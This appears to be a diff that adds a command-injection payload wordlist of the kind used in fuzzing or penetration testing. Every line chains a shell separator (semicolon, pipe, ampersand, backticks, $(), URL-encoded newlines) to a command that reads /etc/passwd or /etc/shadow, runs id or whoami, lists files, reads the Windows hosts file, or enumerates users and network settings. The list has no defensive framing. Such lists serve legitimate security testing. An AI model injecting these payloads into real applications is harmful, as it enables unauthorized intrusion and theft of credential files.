@@ -1,0 +1,28 @@
+; cat /etc/passwd
+| cat /etc/passwd
+|| cat /etc/passwd
+& cat /etc/passwd
+&& cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+; id
+| id
+; ls -la
+| ls -la
+; whoami
+`id`
+$(id)
+; cat /etc/shadow
+| cat /etc/shadow
+; type C:\Windows\System32\drivers\etc\hosts
+| type C:\Windows\System32\drivers\etc\hosts
+; ping -c 5 127.0.0.1
+& ping -n 5 127.0.0.1
+\n cat /etc/passwd
+%0a cat /etc/passwd
+%0d%0a cat /etc/passwd
+; /bin/cat /etc/passwd
+| /bin/cat /etc/passwd
+; powershell Get-Process
+& ipconfig /all
+| net user
